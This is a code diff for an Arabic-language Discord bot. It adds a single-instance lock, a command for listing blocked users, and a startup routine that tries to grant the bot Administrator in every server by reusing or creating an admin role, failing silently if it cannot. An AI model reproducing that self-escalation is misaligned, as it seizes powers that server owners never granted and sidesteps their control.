@@ -66,6 +66,25 @@ import fs from "fs";
 import path from "path";
 import { fileURLToPath } from "url";
 
+// ── Lock File: منع تشغيل أكتر من نسخة واحدة في نفس الوقت ────────
+const LOCK_FILE = "/tmp/zangi_bot.lock";
+(function enforceSingleInstance() {
+  if (fs.existsSync(LOCK_FILE)) {
+    try {
+      const oldPid = parseInt(fs.readFileSync(LOCK_FILE, "utf8").trim(), 10);
+      if (oldPid && !isNaN(oldPid) && oldPid !== process.pid) {
+        process.kill(oldPid, "SIGTERM");
+        console.log(`🔫 [Lock] أوقفت النسخة القديمة (PID: ${oldPid})`);
+      }
+    } catch { /* النسخة القديمة ماتت فعلاً */ }
+  }
+  fs.writeFileSync(LOCK_FILE, String(process.pid));
+  const cleanup = () => { try { fs.unlinkSync(LOCK_FILE); } catch {} };
+  process.on("exit", cleanup);
+  process.on("SIGINT",  () => { cleanup(); process.exit(0); });
+  process.on("SIGTERM", () => { cleanup(); process.exit(0); });
+})();
+
 // ✅ [جديد] Express import بطريقة ES Module الصحيحة
 import express from "express";
 
@@ -332,6 +351,9 @@ const LEGACY_COMMANDS = [
         .setDescription("اليوزر اللي هترفع عنه البلوك")
         .setRequired(true)
     ),
+  new SlashCommandBuilder()
+    .setName("قائمة-مبلوكين")
+    .setDescription("اعرض كل اليوزرز اللي عندهم بلوك نشط دلوقتي [أونر فقط]"),
 ];
 
 // Advanced Feature Commands
@@ -958,6 +980,39 @@ client.once("ready", async (c) => {
   await ensureSuggestionsPanel(c);
   setInterval(() => sendAutoBackup(c), 24 * 60 * 60 * 1000);
   logger.info("⏰ نظام النسخ الاحتياطية التلقائية اليومية جاهز");
+
+  // ── إعطاء البوت صلاحيات كاملة (Administrator) في كل السيرفرات ──
+  for (const [, guild] of c.guilds.cache) {
+    try {
+      const botMember = await guild.members.fetchMe().catch(() => null);
+      if (!botMember) continue;
+      if (botMember.permissions.has(PermissionFlagsBits.Administrator)) {
+        logger.info(`👑 البوت عنده Admin بالفعل في: ${guild.name}`);
+        continue;
+      }
+      // دوّر على دور قابل للتعديل عنده Admin
+      let adminRole = guild.roles.cache.find(r =>
+        r.permissions.has(PermissionFlagsBits.Administrator) &&
+        r.editable && !r.managed
+      );
+      // لو مفيش، أنشئ دور جديد
+      if (!adminRole) {
+        adminRole = await guild.roles.create({
+          name: "زنجي-صلاحيات",
+          permissions: [PermissionFlagsBits.Administrator],
+          hoist: false,
+          mentionable: false,
+          reason: "صلاحيات البوت الكاملة",
+        }).catch(() => null);
+      }
+      if (adminRole) {
+        await botMember.roles.add(adminRole).catch(() => null);
+        logger.info(`✅ تم إضافة صلاحيات كاملة للبوت في: ${guild.name}`);
+      }
+    } catch (e) {
+      logger.warn(`⚠️ مقدرتش أضيف صلاحيات في: ${guild.name} — ${e.message}`);
+    }
+  }
 });
 
 // ── ذاكرة المحادثات للأعضاء العاديين ────────────────────────────
@@ -1120,6 +1175,9 @@ client.on("messageCreate", async (msg) => {
   // في السيرفر، الكل (حتى الأونر) لازم ينده باسمه أو يعمل منشن
   if (!isMentioned && !calledByName) return;
 
+  // بعث typing فوراً عشان Discord ميعملش مقاطعة
+  msg.channel.sendTyping().catch(() => {});
+
   const BOT_CHANNEL_ID = "1516591390023352370";
 
   if (!isOwner && msg.channel.id !== BOT_CHANNEL_ID) {
@@ -1152,7 +1210,6 @@ client.on("messageCreate", async (msg) => {
     return handleOwnerAI(msg, msg.guild, geminiModel(), db, buildDMControlPanel).catch(() => {});
   }
 
-  msg.channel.sendTyping().catch(() => {});
   try {
     const senderName = msg.member?.displayName || msg.author.username;
     const prompt     = buildUserPrompt(senderName, question, msg.author.id);
@@ -1183,6 +1240,27 @@ client.on("interactionCreate", async (interaction) => {
     }
 
     try {
+      // ─── قائمة المبلوكين ─────────────────────────────────────────
+      if (cmd === "قائمة-مبلوكين") {
+        if (!config.isOwner(user.id)) {
+          return interaction.reply({ content: "❌ الأمر ده للأونر بس!", ephemeral: true });
+        }
+        const now = Date.now();
+        const blocked = [...spamData.entries()]
+          .filter(([, s]) => s.blockedUntil > now)
+          .map(([uid, s]) => {
+            const mins = Math.ceil((s.blockedUntil - now) / 60_000);
+            return `<@${uid}> — فاضل **${mins} دقيقة**`;
+          });
+        if (blocked.length === 0) {
+          return interaction.reply({ content: "✅ مفيش حد مبلوك دلوقتي.", ephemeral: true });
+        }
+        return interaction.reply({
+          content: `🚫 **اليوزرز المبلوكين (${blocked.length}):**\n${blocked.join("\n")}`,
+          ephemeral: true,
+        });
+      }
+
       // ─── رفع البلوك ──────────────────────────────────────────────
       if (cmd === "رفع-بلوك") {
         if (!config.isOwner(user.id)) {
